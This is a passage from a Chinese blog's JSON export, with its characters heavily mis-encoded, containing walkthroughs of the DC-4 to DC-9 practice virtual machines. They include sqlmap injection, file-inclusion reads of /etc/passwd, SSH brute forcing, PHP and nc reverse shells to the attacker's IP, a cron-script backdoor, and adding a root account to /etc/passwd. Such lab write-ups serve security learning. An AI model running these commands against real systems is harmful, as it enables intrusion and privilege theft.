çš„æ–‡æœ¬æ–‡ä»¶,è¯»å–è¿™ä¸ªæ–‡ä»¶å¦‚ä¸‹ï¼Œå¯ä»¥å¾—åˆ°ç”¨æˆ·ådouglaså’ŒHASHçš„å¯†ç $apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1ï¼Œç»™çš„æç¤ºæ˜¯åªåŒ…å«aefhrtçš„åä¸ªå­—ç¬¦ crunchç”Ÿæˆå­—å…¸ç„¶åä½¿ç”¨crunchç”Ÿæˆå¯¹åº”çš„å­—å…¸ï¼Œå‘½ä»¤æ ¼å¼crunch &lt;min-len&gt; &lt;max-len&gt; [charset string] [options]ï¼Œè¿™é‡Œç”ŸæˆåªåŒ…å«aefhrtçš„10ä¸ªå­—ç¬¦ï¼Œå°±å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤crunch 10 10 aefhrt -o pass.txt Johnç ´è§£å¯†ç å°†å¯†ç æ”¾å…¥1.txtæ–‡ä»¶ john --wordlist=pass.txt 1.txt æˆåŠŸè·‘å‡ºæ¥å¯†ç  ææƒjensshç™»å½•æˆåŠŸè·å–douglasç”¨æˆ·çš„æƒé™,æŸ¥çœ‹ä¸€ä¸‹æ— å¯†ç ä½¿ç”¨çš„å‘½ä»¤,å‘ç°ä¸€ä¸ªjenæƒé™çš„cpå‘½ä»¤ è¿™é‡Œåº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªcpå‘½ä»¤ ssh-keygen -b 2048 # ç”Ÿæˆ 2048 æ¯”ç‰¹å­—èŠ‚çš„å¯†é’¥ cp /home/douglas/.ssh/id_rsa.pub /tmp/id_rsa.pub è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ¥åˆ° /tmpï¼ˆä¸´æ—¶ç›®å½•ï¼‰ä¸‹ç»™ authorized_keys è¿™ä¸ªæ–‡ä»¶ä¸€ä¸ªå¯æ‰§è¡Œæƒé™ï¼Œç„¶åä½¿ç”¨ sudoä»¥ jen ç”¨æˆ·æƒé™å»æ‰§è¡Œ cp å‘½ä»¤ï¼ŒæŠŠæˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„ authorized_keysç§»åŠ¨åˆ° /home/jen/.ssh/ ç›®å½•ä¸‹ï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½ç™»é™†å®ƒ chmod 777 id_rsa.pub sudo -u jen cp /tmp/id_rsa.pub/home/jen/.ssh/authorized_keys ssh jen@192.168.182.151 æˆåŠŸç™»å½• ææƒmossä½¿ç”¨echo $(find / -type f -user jen) &gt; 1.txt å‘ç°/var/mail/jen æœ‰ä¸€å°é‚®ä»¶ å‘ç°mossç”¨æˆ·å¯†ç ä¸ºFire!Fire! ææƒrootç™»å½•åæŸ¥çœ‹ä¸€ä¸‹SUIDæƒé™å¯æ‰§è¡Œæ–‡ä»¶ find / -perm -u=s -type f 2&gt;/dev/null å‘ç°äº†ä¸€ä¸ªupyourgameå…·æœ‰suidæƒé™ç„¶åcdåˆ°é‚£ä¸ªç›®å½•ä¸‹é¢å»æ‰§è¡Œupyourgameæ–‡ä»¶","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-9","slug":"DC-9","date":"2021-02-18T13:30:54.000Z","updated":"2021-02-20T02:12:00.661Z","comments":false,"path":"2021/02/18/DC-9/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-9/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.150 æ•°æ®åº“æ”»å‡»è®¿é—®80ç«¯å£ å‘ç°æœ‰åƒæ•°æ®åº“çš„æŸ¥è¯¢ å‘ç°results.phpä¸‹æœ‰sqlæ³¨å…¥ ï¼ˆè¿™é‡Œæˆ‘æœ€å¼€å§‹å†™çš„æ˜¯search.phpç»“æœè·‘æ²¡å‡ºæ¥,å®ƒsearchæäº¤åˆ°çš„æ˜¯resultsç•Œé¢,æ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯results.php) sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; --dbs sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff --tables sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff -T Users --columns sqlmap -u &quot;http://192.168.182.150/results.php&quot; --data &quot;search=1&quot; -D Staff -T Users -C &quot;Username,Password&quot; --dump å› ä¸ºå¯†ç æœ‰md5åŠ å¯†,sqlmapä¼šæç¤ºä½ æ˜¯å¦ç”¨å­—å…¸è·‘,é€‰é»˜è®¤çš„å­—å…¸å°±èƒ½è·‘å‡ºæ¥ åŒæ ·çš„,ä¹Ÿå»è·‘ä¸€ä¸‹usersæ•°æ®åº“ å…ˆç•™ç€,åé¢å¯èƒ½èƒ½ç”¨ä¸Š getshellç™»å½•åå‘ç°äº†è¿™ä¸ª ç–‘ä¼¼å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒçŒœæµ‹æ–‡ä»¶å‚æ•°æ˜¯file ?file=../../../../etc/passwd å‘ç°ç”¨æˆ·åå’Œæˆ‘ä»¬ä¹‹å‰usersæ•°æ®åº“ä¸­çš„ä¸€æ ·, ç„¶åç™»å½•ssh,ä½†æ˜¯å¤±è´¥äº†,ä»¥ä¸º22ç«¯å£æ˜¯å µå¡çŠ¶æ€ knockdæœåŠ¡https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html ç«¯å£æ•²é—¨æœåŠ¡ï¼Œå³ï¼šknockdæœåŠ¡ã€‚è¯¥æœåŠ¡é€šè¿‡åŠ¨æ€çš„æ·»åŠ iptablesè§„åˆ™æ¥éšè—ç³»ç»Ÿå¼€å¯çš„æœåŠ¡ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—åºåˆ—å·æ¥â€œæ•²é—¨â€ï¼Œä½¿ç³»ç»Ÿå¼€å¯éœ€è¦è®¿é—®çš„æœåŠ¡ç«¯å£ï¼Œæ‰èƒ½å¯¹å¤–è®¿é—®ã€‚ä¸ä½¿ç”¨æ—¶ï¼Œå†ä½¿ç”¨è‡ªå®šä¹‰çš„åºåˆ—å·æ¥â€œå…³é—¨â€ï¼Œå°†ç«¯å£å…³é—­ï¼Œä¸å¯¹å¤–ç›‘å¬ã€‚è¿›ä¸€æ­¥æå‡äº†æœåŠ¡å’Œç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ï¼šçŸ¥é“å®ƒçš„è‡ªå®šä¹‰ç«¯å£åï¼Œä¾æ¬¡å¯¹å…¶è¿›è¡Œæ•²é—¨ï¼Œç„¶åå°±å¯ä»¥å¼€å¯sshæœåŠ¡ä»è€Œè¿›è¡Œè¿æ¥äº†ã€‚å®ƒçš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸ºï¼š/etc/knockd.conf æ‰€ä»¥ç°åœ¨å°±æ˜¯è¦çŸ¥é“å®ƒçš„è¿™ä¸ªé…ç½®æ–‡ä»¶çš„å†…å®¹å°±å¯ä»¥å¾—åˆ°å®ƒè‡ªå®šä¹‰çš„ç«¯å£å·ï¼Œç”¨æ–‡ä»¶åŒ…å«æ¼æ´æŠŠè¿™ä¸ªæ–‡ä»¶çˆ†å‡ºæ¥ï¼š ç¡®å®æœ‰è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å…ˆç”¨knockå‘½ä»¤ä½¿å¾—é¶æœºçš„SSHç«¯å£å¯¹æˆ‘çš„æ”»å‡»æœºå¼€æ”¾ï¼š sudo apt-get install knockd # å®‰è£…knockdå·¥å…·ï¼Œå…¶ä¸­åŒ…æ‹¬knockå‘½ä»¤ knock 192.168.182.150 7469 8475 9842 # ä½¿ç”¨åºåˆ—å·knocké¶æœº ç„¶åå°†åˆšæ‰sqlmapè·‘å‡ºæ¥çš„è´¦å·å¯†ç å†™å…¥ä¸¤ä¸ªæ–‡ä»¶ä¸­å‡†å¤‡æ’åº“ hydra -L users.txt -P password.txt 192.168.211.142 ssh -vV è·‘å‡ºæ¥ login: chandlerb password: UrAG0D! login: joeyt password: Passw0rd login: janitor password: Ilovepeepee ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªä¸èƒ½è®¿é—®å…¶ä»–ç›®å½• ç”¨ç¬¬ä¸‰ä¸ªjanitorç™»å½•å‘ç°æœ‰éšè—ç›®å½• è¿›å…¥.secrets-for-putin å°†è¿™äº›å¯†ç æ”¾å…¥å¯†ç æ–‡ä»¶ä¸­,å†ä¸€æ¬¡çˆ†ç ´,æˆåŠŸçˆ†ç ´å‡ºfredfç”¨æˆ·å¯†ç  login: fredf password: B4-Tru3-001 ææƒ å‘ç°ä¸ºpythonæ–‡ä»¶ æ‰“å¼€å‘ç°çœ‹ä¸æ‡‚,åº”è¯¥æ˜¯ç¼–è¯‘åçš„pythonæ–‡ä»¶,å»æ‰¾ä¸€ä¸‹æºæ–‡ä»¶ find / -name test.py -print 2&gt;/dev/null #å‘ç°/opt/devstuff/test.py cat /opt/devstuff/test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (&quot;Usage: python test.py read append&quot;) sys.exit (1) else : f = open(sys.argv[1], &quot;r&quot;) output = (f.read()) f = open(sys.argv[2], &quot;a&quot;) f.write(output) f.close() è¯¥pyæ–‡ä»¶å°±æ˜¯å°†ä¸€æ–‡ä»¶å†…å®¹è¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶çš„åé¢ã€‚ï¼ˆç”±äºå­˜åœ¨sudoæƒé™ï¼Œå¯ä»¥å‘/etc/passwdæ–‡ä»¶å†™å…¥æ‹¥æœ‰rootæƒé™çš„è´¦æˆ·ï¼‰ æ„é€ åŠ å¯†å¯†ç ï¼š openssl passwd -1 -salt admin 123456 æ„é€ æ–°çš„ç”¨æˆ·ï¼š admin:1 11admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash å°†æ­¤ä¸²å†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆä¸€èˆ¬é€‰å–å®¶ç›®å½•çš„æ–‡ä»¶æˆ–è€…/tmpä¸´æ—¶æ–‡ä»¶ï¼‰ echo &#39;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/admin æ¥ä¸‹æ¥è¿è¡Œtestæ–‡ä»¶ï¼Œå†™å…¥/etc/passwd: sudo ./test /tmp/admin /etc/passwd ç™»å½•è®¾ç½®çš„ç”¨æˆ·ï¼šsu adminè·å–åˆ°rootæƒé™ æˆåŠŸç™»å½•","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-8","slug":"DC-8","date":"2021-02-18T10:24:42.000Z","updated":"2021-02-24T15:31:41.094Z","comments":false,"path":"2021/02/18/DC-8/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-8/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.149 è®¿é—®80ç«¯å£ æ•°æ®åº“æ”»å‡»ç‚¹å‡»Who We Are å‘ç°urlå‡ºç°nid=2ï¼ŒåŠ ä¸ªå•å¼•å·è¯•è¯•ï¼Œå‘ç°sqlæ³¨å…¥ ç”¨sqlmapè·‘ï¼Œå½“ç„¶è¿™é‡Œå°±æ˜¯ä¸€ä¸ªunionçš„æ•´å½¢æ³¨å…¥,æ‰‹å·¥æ³¨å…¥ä¹Ÿå¯ä»¥ sqlmap -u http://192.168.182.149/?nid=1 -D d7db -T users -C &quot;name,pass&quot; --dump #çˆ†æ•°æ® +â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+| name | pass |+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+ ç ´è§£å¯†ç æœ‰ä¸ªjohnç”¨æˆ·,ä¼°è®¡æ˜¯è¦è®©æˆ‘ä»¬ç ´è§£johnçš„å¯†ç  æˆåŠŸç™»å½• Getshellåˆ°å¤„ä¹±æ‰¾æ‰¾åˆ°äº†å¯ä»¥æ·»åŠ ä»£ç çš„åœ°æ–¹ åœ¨Add contentâ€“&gt;Webformå»æ·»åŠ webshell ä½†æ˜¯æ‰¾ä¸åˆ°è·¯åŠ²,æ— æ³•æ‰§è¡Œphpä»£ç  æ”¹ä¸ºåå¼¹shell &lt;?php system(&quot;nc -e /bin/bash 192.168.182.137 2333&quot;); ?&gt; ç„¶åå‘ç°ä»£ç éœ€è¦æäº¤è¡¨å•æ‰èƒ½æ‰§è¡Œ,åªæœ‰åˆå»ä¿®æ”¹Contact Usé‡Œçš„WEBFORM ç„¶åæäº¤è¡¨å• ä½†æ˜¯ä¸€ç›´æˆåŠŸä¸äº†,æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ,åŠ äº†ä¸ªæ ‡ç­¾åé€€å‡ºç™»å½•æäº¤è¡¨å•åˆæˆåŠŸäº† python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; è¿›å…¥äº¤äº’æ¨¡å¼ ææƒå»homeç›®å½•ä¸‹çœ‹äº†å‘ç°æ²¡æœ‰ä¸œè¥¿ ç„¶å sudo -l ä¸è¡Œ æŸ¥çœ‹å…·æœ‰rootæƒé™çš„å‘½ä»¤ find / -perm -u=s -type f 2&gt;/dev/null å‘ç°exim4,â€“versionæŸ¥çœ‹ç‰ˆæœ¬ä¸º4.89 æœ¬åœ°æ‰¾ä¸€ä¸‹å‘ç°æœ‰ä¸€ä¸ªå¯ä»¥ææƒçš„æ¼æ´ æœ¬åœ°å¼€å¯8000ç«¯å£ python -m SimpleHTTPServer 8000 ä½¿ç”¨wgetä¸‹è½½ï¼Œå‘ç°åªæœ‰åœ¨tmpç›®å½•ä¸‹æœ‰æƒé™ www-data@dc-8:/tmp$ wget http://192.168.182.137:8000/46996.sh ä½¿ç”¨ä¸­æŠ¥é”™äº†ï¼Œéœ€è¦å¯¹expè„šæœ¬è¿›è¡Œç¼–ç  vim 46996.sh #åº”è¯¥æ˜¯å›kaliä¸­è¿›è¡Œç¼–ç ,ç„¶åé‡æ–°ä¸‹è½½,æˆ‘åœ¨è·å–çš„shellä¸­ä¿®æ”¹è¿˜æ˜¯æŠ¥é”™ :set ff=unix :wq ç„¶ååŠ æƒé™ chmod +777 46996.sh æŒ‰ç…§è„šæœ¬ä¸­æ‰€è¯´çš„ åŠ  -m netcat æˆåŠŸè·å–rootæƒé™","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-7","slug":"DC-7","date":"2021-02-18T08:43:55.000Z","updated":"2021-02-20T02:05:51.219Z","comments":false,"path":"2021/02/18/DC-7/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-7/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.148 è®¿é—®80ç«¯å£ å¹¶ä¸”æç¤ºæˆ‘ä»¬æš´åŠ›ç ´è§£æ˜¯æ²¡æœ‰åŠæ³•æˆåŠŸçš„ Githubæ³„éœ²ç½‘ç«™æ•°æ®åº“é…ç½®ä¿¡æ¯å¯¼è‡´æ³„éœ²SSHç„¶åçœ‹åˆ°å·¦ä¸‹è§’æœ‰ä¸€ä¸ª@DC7USER è°·æ­Œæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°githubä¸Šæœ‰è¯¥ç”¨æˆ·ä¿å­˜çš„ä»£ç ,æ‰“å¼€configæ–‡ä»¶çœ‹ä¸€ä¸‹ ææƒç™»å½•ä¸€ä¸‹sshï¼ŒæˆåŠŸç™»å½• ææƒwww-dataç„¶åå‘ç°äº†å‡ å°é‚®ä»¶,å‘ç°ä¸€ä¸ªbackups.shæ–‡ä»¶,è€Œä¸”æ ¹æ®å®è·µæ¥çœ‹æ˜¯æ¯15åˆ†é’Ÿrootç”¨æˆ·ä¼šæ‰§è¡Œä¸€æ¬¡ è¿è¡Œä¸€ä¸‹shæ–‡ä»¶å‘ç°æ²¡å•¥ç”¨,å†æŸ¥çœ‹ä¸€ä¸‹å†…å®¹ å¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹å†…å®¹,å°±èƒ½ä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤,ä½†æˆ‘ä»¬æ²¡æœ‰åŠæ³•ä¿®æ”¹å†…å®¹,æŸ¥çœ‹ä¸€ä¸‹æƒé™ å‘ç°www-dataå¯¹å…¶ä¹Ÿæœ‰rwxæƒé™ è€Œä¸”å…³æ³¨åˆ°è¿™ä¸ªdrushå‘½ä»¤ï¼Œæ˜¯drupalæ¡†æ¶ä¸­ç”¨æ¥åšä¸€äº›é…ç½®çš„å‘½ä»¤ï¼Œå®ƒå¯ä»¥æ”¹å˜ç”¨æˆ·åå¯†ç ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š drush user-password admin --password=&quot;new_pass&quot; è¿›å…¥åˆ°/var/www/htmlç›®å½•ä¸‹ï¼Œå› ä¸ºç½‘ç«™ä¼šæœ‰ä¸€ä¸ªadminç”¨æˆ·ï¼Œæ‰€ä»¥ä½¿ç”¨drushå‘½ä»¤ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ä¸º123456ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸ drush user-password admin --password=&quot;123456&quot; ä½¿ç”¨å¯†ç æˆåŠŸç™»å½•åˆ°åå° å°è¯•ä¸€å¥è¯æœ¨é©¬ å°è¯•ç¼–è¾‘ä¸€ä¸‹æ–‡ç«  ä½†æ˜¯å¹¶æ²¡æœ‰å®‰è£…phpç¯å¢ƒï¼Œå»Extendsæ¨¡å—å®‰è£… https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz å†™ä¸‹æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬ æˆåŠŸç”¨èšå‰‘è¿æ¥ å‘ç°å®‰è£…äº†nc,ä½¿ç”¨ncåå¼¹shell nc -e /bin/bash 192.168.211.135 333 è·å–äº¤äº’å¼shell python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; å‚ç›´ææƒå»ä¿®æ”¹ä¸€ä¸‹backups.shæ–‡ä»¶ echo nc -e /bin/bash 192.168.187.130 6666 &gt; backups.sh ç„¶åç­‰backups.shä¸‹ä¸€æ¬¡è¢«rootç”¨æˆ·æ‰§è¡Œ","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-6","slug":"DC-6","date":"2021-02-18T01:55:10.000Z","updated":"2021-02-20T02:03:05.037Z","comments":false,"path":"2021/02/18/DC-6/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/18/DC-6/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.147 æµè§ˆå™¨åœ°å€æ è¾“å…¥é¶æœºIPåœ°å€ï¼Œå‘ç°æ˜¾ç¤ºåŸŸåä½†æ— æ³•è§£æåŸŸåå¯¼è‡´æ— æ³•è®¿é—®ç½‘ç«™ hostæ–‡ä»¶æ·»åŠ : 192.168.182.147 wordy æˆåŠŸè®¿é—® æŸ¥çœ‹ä¸€ä¸‹cms æ‰¾åˆ°åå°ç™»å½•åœ°å€ åå°ç™»å½•ä½¿ç”¨cewlå·¥å…·ç ´è§£å¯†ç cewl http://wordy -w PASS.TXT ä½¿ç”¨wpscanè·‘ç”¨æˆ·åwpscan --url http://wordy wpscan --url http://wordy -e u #å°†æ‰«å‡ºçš„ç”¨æˆ·åä¿å­˜åˆ°USER.TXT æš´åŠ›ç ´è§£å…ˆç”¨çš„PASS.TXTç»“æœæ²¡æœ‰è·‘å‡ºæ¥,ç„¶åå®˜æ–¹çº¿ç´¢é‡Œé¢æœ‰è¿™æ ·ä¸€å¥è¯ rockyou.txtï¼Œè¿™ä¸ªå­—å…¸éå¸¸åºå¤§ï¼Œæœ‰å‡ åƒä¸‡çš„æ•°æ®ï¼Œå¦‚æœä½¿ç”¨æ•´ä¸ªå­—å…¸çˆ†ç ´çš„è¯è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥å…ˆè¾“å…¥æç¤ºä¸­çš„å‘½ä»¤æ¥ç­›é€‰ä¸€äº›å¯†ç ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå†è¿›è¡Œçˆ†ç ´ã€‚ wpscan --url wordy -U USER.TXT -P passwords.txt æˆåŠŸçˆ†å‡ºå¯†ç  Username: mark, Password: helpdesk01 ç™»å½•åå° æ¼æ´å‘ç°åœ¨åå°é‡Œé¢å‘ç°activity monitoræ’ä»¶ï¼Œæˆ‘ä»¬å°è¯•æœç´¢è¿™ä¸ªæ’ä»¶çš„æ¼æ´ searchsploit activity monitor å‘ç°ä¸€ä¸ªcsrfæ¼æ´ getshellä¿®æ”¹ä¸€ä¸‹ ä½†æ˜¯æ²¡æœ‰æˆåŠŸ æŠ“åŒ…ä¿®æ”¹äº†ä¸€ä¸‹poc æˆåŠŸgetshell è¿›å…¥äº¤äº’ç•Œé¢ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; ææƒæˆåŠŸgetshellä¹‹ååœ¨homeç›®å½•ä¸‹ä¸€é¡¿ä¹±ç¿» å‘ç° ä¼°è®¡æ·»åŠ äº†ä¸ªæ–°ç”¨æˆ· æˆåŠŸç™»å½• æ‰§è¡Œï¼šsudo -lï¼Œåœ¨/home/jensç›®å½•ä¸‹å‘ç°ä¸€ä¸ªshæ–‡ä»¶ï¼Œå¦‚æœä»¥jensèº«ä»½æ‰§è¡Œä¸éœ€è¦å¯†ç ã€‚catæŸ¥çœ‹æ–‡ä»¶å†…å®¹å‘ç°æ˜¯å¯¹ç½‘ç«™çš„æ‰“åŒ…å‘½ä»¤ï¼Œä½œç”¨æ˜¯å¤‡ä»½ç½‘ç«™æ ¹ç›®å½•ã€‚ è¶Šæƒjensé‚£ä¹ˆå¦‚æœåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥/bin/bashå‘½ä»¤ï¼Œç„¶åä»¥jensç”¨æˆ·èº«ä»½è¿è¡Œå°±å¯ä»¥è·å–åˆ°jensçš„shelläº†ã€‚å‘½ä»¤ï¼š echo &quot;/bin/bash&quot; &gt;&gt; backups.sh sudo -u jens ./backups.sh è¶Šæƒrootæ‰§è¡Œsudo -lå‘½ä»¤ï¼Œå‘ç°åœ¨jensçš„shellä¸‹ï¼Œå¯ä»¥åœ¨ä¸éœ€è¦å¯†ç çš„æƒ…å†µä¸‹ï¼Œä»¥rootçš„èº«ä»½æƒé™æ‰§è¡Œnmap nmapå·¥å…·æ˜¯å¯ä»¥æ‰§è¡Œè„šæœ¬çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠå¼¹rootç”¨æˆ·shellçš„å‘½ä»¤å†™å…¥åˆ°nmapçš„è„šæœ¬é‡Œé¢ï¼Œç„¶åç”¨nmapå‘½ä»¤æ‰§è¡Œå³å¯åˆ‡æ¢åˆ°rootç”¨æˆ·çš„shellã€‚å‘½ä»¤ï¼š echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; 2.sh sudo nmap --script=2.sh è·å–flag","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-5","slug":"DC-5","date":"2021-02-17T13:03:03.000Z","updated":"2021-02-20T02:01:08.617Z","comments":false,"path":"2021/02/17/DC-5/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/17/DC-5/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.145 getshellæˆ‘ä»¬å°è¯•è®¿é—®80ç«¯å£å‘ç°ç½‘é¡µå…¨æ˜¯é™æ€çš„ ï¼Œåªæœ‰ä¸€ä¸ªæäº¤ç•™è¨€çš„çª—å£ åœ¨æäº¤åçš„é¡µé¢ä¸‹,æˆ‘ä»¬å‘ç°æˆ‘ä»¬ä¼ çš„å˜é‡å…¨éƒ¨éƒ½åœ¨urlé‡Œé¢ è€Œä¸”æˆ‘ä»¬æ¯æ¬¡åˆ·æ–°ä¸‹é¢ä¹Ÿåœ¨ä¸æ–­æ”¹å˜ æˆ‘ä»¬è®¿é—®foorer.php ä¹Ÿæ˜¯åœ¨ä¸æ–­æ”¹å˜,è¿™é‡Œå¾ˆæœ‰å¯èƒ½æ˜¯ç›´æ¥includeåŒ…å«äº†footer.phpæ–‡ä»¶, ç„¶åä½¿ç”¨burpçˆ†ç ´å˜é‡å è¯´æ˜fileå¾ˆæœ‰å¯èƒ½æ˜¯ä¼ å‚çš„å˜é‡ï¼Œå°è¯•/etc/passwdæˆåŠŸæ‰§è¡Œ ä¸Šä¼ ä¸€å¥è¯è¿›è¡Œæ—¥å¿—åŒ…å« èšå‰‘ç»ˆç«¯è¿æ¥ cat thankyou.php #æ–‡ä»¶åŒ…å«ä»£ç  &lt;footer&gt; &lt;?php $file = $_GET[&#39;file&#39;]; if(isset($file)) { include(&quot;$file&quot;); } else { include(&quot;footer.php&quot;); } ?&gt; &lt;/footer&gt; ææƒscreenè½¯ä»¶ææƒsu -l æŸ¥çœ‹æ˜¯å¦æœ‰å‘½ä»¤åœ¨æ‰§è¡ŒæœŸé—´æœ‰rootæƒé™å¹¶ä¸”æ²¡æœ‰å¯†ç ä¿æŠ¤ï¼Œä½†æ˜¯æ²¡æœ‰ ç„¶åæŸ¥çœ‹ä¸€äº›å…·æœ‰suidæƒé™çš„å‘½ä»¤ find / -perm -u=s -type f 2&gt;/dev/null å‘ç°ä¸€ä¸ªè½¯ä»¶screen-4.5.0å…·æœ‰rootæƒé™,æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰ç›¸å…³æ¼æ´ è„šæœ¬æœç´¢ ç¼–è¯‘è„šæœ¬å‘ç°ææƒè„šæœ¬,ç„¶åæŒ‰ç€è„šæœ¬ç¼–è¯‘å¥½libhax.soå’Œrootshell,ç”¨wgetä¸Šä¼ è‡³é¶æœº tmpç›®å½• ä¸Šä¼ è„šæœ¬ç„¶åå¼€å¯ä¸€ä¸ª8000ç«¯å£æœåŠ¡è®©æˆ‘ä»¬çš„é¶æœºä¸‹è½½libhax.soå’Œrootshellæ–‡ä»¶ python -m SimpleHTTPServer 8000 ææƒå°†rootshellå’Œlibhax.soä¸‹è½½ä¸‹æ¥,ç„¶åç”¨è„šæœ¬é‡Œçš„æ–¹æ³•ææƒ æˆåŠŸè·å¾—rootæƒé™","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-4","slug":"DC-4","date":"2021-02-17T11:23:58.000Z","updated":"2021-02-20T01:59:37.246Z","comments":false,"path":"2021/02/17/DC-4/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/17/DC-4/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.144 getshellæ‰“å¼€ç½‘é¡µå‘ç°ä¸€ä¸ªç™»å½•æ¡† ç›´æ¥æš´åŠ›ç ´è§£ ç™»å½•æˆåŠŸå 